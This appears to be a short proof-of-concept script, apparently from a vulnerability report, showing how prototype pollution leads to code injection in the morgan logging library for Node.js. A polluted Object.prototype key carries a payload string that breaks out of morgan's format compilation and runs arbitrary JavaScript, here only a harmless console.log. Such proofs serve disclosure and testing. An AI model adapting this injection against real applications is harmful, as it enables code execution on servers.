var morgan = require('morgan');
//payload delivered through a prototype pollution attack
Object.prototype[':method :url :status :res[content-length] - :response-time ms'] = '25 \\" + console.log(\'hello!\'); +  //:method :url :status :res[content-length] - :response-time ms';
//benign looking usage of morgan that can be exploited due to the prototype pollution attack
var f = morgan(':method :url :status :res[content-length] - :response-time ms');
f({}, {}, function () {
});
